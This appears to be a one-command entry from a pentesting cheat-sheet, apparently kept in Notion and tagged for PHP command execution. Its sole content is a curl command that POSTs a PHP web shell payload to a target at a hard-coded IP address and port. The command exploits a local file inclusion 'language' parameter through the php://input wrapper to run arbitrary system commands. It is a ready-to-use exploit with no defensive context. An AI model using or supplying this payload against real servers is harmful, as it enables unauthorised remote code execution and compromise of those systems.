# Execute command via curl and php input filter (POST)

OS: PHP, Web
Description: Execute Command via curl and php input filter (POST)
Security Domains: Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: php (https://www.notion.so/php-1434c8e52376804ead3ae9544b43bbb0?pvs=21)

```jsx
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://83.136.253.251:41973/index.php?language=php://input&cmd=INSERT_COMMAND_HERE" > test.html
```